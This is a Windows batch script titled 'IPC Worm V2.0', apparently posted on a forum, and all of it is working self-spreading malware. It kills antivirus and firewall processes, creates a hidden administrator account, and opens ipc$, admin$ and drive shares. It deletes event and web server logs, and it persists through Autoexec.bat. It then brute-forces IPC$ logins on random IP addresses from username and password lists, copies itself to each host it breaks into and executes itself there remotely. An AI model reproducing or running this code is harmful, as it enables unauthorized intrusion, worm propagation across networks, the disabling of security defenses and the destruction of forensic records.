REM -----IPC Worm V2.0 -----
REM  ########################
REM ≈‰÷√≤ø∑÷
SET addadmin=worm 
SET SORI=1
SET ADDR1=254
SET ADDR2=254
SET ADDR3=254
SET ADDR4=254
SET WORM=Rundll32.bat
REM #######################
Copy /y %windir%\system32\%WORM% C:\Autoexec.bat
Copy /y %windir%\system32\%WORM% %windir%\system32\Winstart.bat
PSK Rfw.exe
PSK KAVPFW.exe
PSK KAV9X.exe
PSK VPC32.exe
PSK PFW.exe
PSK RavMon.exe
net user %addadmin% /add
IF %ERRORLEVEL%==0 net localgroup Administrators %addadmin% /add
net share ipc$
net share admin$
net share C$=c:\
net share D$=d:\
net share E$=e:\
net share F$=f:\
del %windir%\system32\logfiles\w3svc1\*.* /f /q
del %windir%\system32\logfiles\w3svc2\*.* /f /q
del %windir%\system32\config\*.event /f /q
del %windir%\system32dtclog\*.* /f /q
del %windir%\*.txt /f /q
del %windir%\*.log /f /q
:IPADDRESS
IF %SORI%==4 SET /A ADDR4=%RANDOM% %% %ADDR4%
IF %SORI%==3 (
SET /A ADDR3=%RANDOM% %% %ADDR3%
SET /A ADDR4=%RANDOM% %% %ADDR4%
)
IF %SORI%==2 (
SET /A ADDR2=%RANDOM% %% %ADDR2%
SET /A ADDR3=%RANDOM% %% %ADDR3%
SET /A ADDR4=%RANDOM% %% %ADDR4%
)
IF %SORI%==1 (
SET /A ADDR1=%RANDOM% %% %ADDR1%
SET /A ADDR2=%RANDOM% %% %ADDR2%
SET /A ADDR3=%RANDOM% %% %ADDR3%
SET /A ADDR4=%RANDOM% %% %ADDR4%
)   
SET ADDRESS=%ADDR1%.%ADDR2%.%ADDR3%.%ADDR4%
FOR /F %%K IN (%windir%\system32\U.txt) DO FOR /F %%J IN (%windir%\system32\P.txt) DO NET USE [url=file://\\%ADDRESS%\IPC$]\\%ADDRESS%\IPC$[/url] %%J /USER:%%K & IF NOT errorlevel 1 GOTO RUN
GOTO IPADDRESS
:RUN
COPY Rundll.bat [url=file://\\%ADDRESS%\ADMIN$\SYSTEM32\%WORM%]\\%ADDRESS%\ADMIN$\SYSTEM32\%WORM%[/url]
IF errorlevel 1 GOTO ERR
COPY U.txt [url=file://\\%ADDRESS%\ADMIN$\SYSTEM32\]\\%ADDRESS%\ADMIN$\SYSTEM32\[/url]
COPY P.txt [url=file://\\%ADDRESS%\ADMIN$\SYSTEM32\]\\%ADDRESS%\ADMIN$\SYSTEM32\[/url]
COPY PS [url=file://\\%ADDRESS%\ADMIN$\SYSTEM32\]\\%ADDRESS%\ADMIN$\SYSTEM32\[/url]
COPY PSK [url=file://\\%ADDRESS%\ADMIN$\SYSTEM32\]\\%ADDRESS%\ADMIN$\SYSTEM32\[/url]
PS [url=file://\\%ADDRESS%]\\%ADDRESS%[/url] %windir%\system32\%WORM%
NET USE [url=file://\\%ADDRESS%\IPC$]\\%ADDRESS%\IPC$[/url] /DEL
GOTO IPADDRESS